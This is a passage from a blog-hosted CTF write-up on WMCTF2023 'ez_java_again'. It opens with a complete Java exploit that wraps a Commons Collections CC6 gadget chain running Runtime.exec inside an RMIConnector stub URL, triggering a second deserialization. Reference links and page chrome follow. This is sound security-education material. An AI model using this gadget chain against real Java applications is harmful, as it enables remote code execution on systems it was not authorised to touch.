+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">package org.example.RMIConnector;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.remote.JMXServiceURL;</span><br><span class="line">import javax.management.remote.rmi.RMIConnector;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class RMIConnector1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);</span><br><span class="line">        setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/stub/&quot;+getCC6Payload(&quot;calc&quot;));</span><br><span class="line">        RMIConnector Rmiconnector = new RMIConnector(jmxServiceURL, null);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        Map hashMap1 = new HashMap();</span><br><span class="line">        Map hashMap2 = new HashMap();</span><br><span class="line">        Map map1 = LazyMap.decorate(hashMap1, new ConstantTransformer(1));</span><br><span class="line">        Map map2 = LazyMap.decorate(hashMap2, invokerTransformer);</span><br><span class="line">        map1.put(&quot;1&quot;, &quot;yy&quot;);</span><br><span class="line">        map2.put(&quot;zZ&quot;, Rmiconnector);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(map1, 1);</span><br><span class="line">        hashtable.put(map2, 1);</span><br><span class="line"></span><br><span class="line">        Field table = hashMap1.getClass().getDeclaredField(&quot;table&quot;);</span><br><span class="line">        table.setAccessible(true);</span><br><span class="line">        Object[] array = (Object[])table.get(hashMap1);</span><br><span class="line">        Object node = array[0];</span><br><span class="line">        if(node == null)&#123;</span><br><span class="line">            node = array[1];</span><br><span class="line">        &#125;</span><br><span class="line">        Field key = node.getClass().getDeclaredField(&quot;key&quot;);</span><br><span class="line">        key.setAccessible(true);</span><br><span class="line">        key.set(node, Rmiconnector);</span><br><span class="line"></span><br><span class="line">//        Serialize(hashtable);</span><br><span class="line">//</span><br><span class="line">//        byte[] bytes = serialize(hashtable);</span><br><span class="line">//        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">        Unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static String getCC6Payload(String cmd) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        //随便设置一个值，防止后面再执行put方法的时候调用链子</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&quot;useless&quot;));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;abc&quot;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, &quot;def&quot;);</span><br><span class="line">        //修改为HashSet调用readObject方法</span><br><span class="line">        HashSet&lt;Object&gt; hashSet = new HashSet&lt;&gt;();</span><br><span class="line">        setFieldValue(hashSet, &quot;map&quot;, hashMap2);</span><br><span class="line">        lazyMap.remove(&quot;abc&quot;);</span><br><span class="line">        setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(hashSet);</span><br><span class="line">        return Base64.getEncoder().encodeToString(barr.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String field, Object val) throws Exception&#123;</span><br><span class="line">        Field dField = obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(true);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link" target="_blank" rel="noopener" href="https://tttang.com/archive/1701/#toc_rmiconnector">https://tttang.com/archive/1701/#toc_rmiconnector<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/372573.html#/">https://www.freebuf.com/articles/web/372573.html#/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/en3rym0131fuby60#">https://www.yuque.com/dat0u/ctf/en3rym0131fuby60#<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                WMCTF2023-ez_java_again(RMIConnector二次反序列化)
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/30/WMCTF2023-ez_java_again(RMIConnector二次反序列化)/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-05-30 19:37</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Cctf/">java反序列化，ctf</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/22/shiro-721/"
+                                   title="shiro-721"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">shiro-721</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMIConnector%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">RMIConnector二次反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMIConnector%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">RMIConnector二次反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
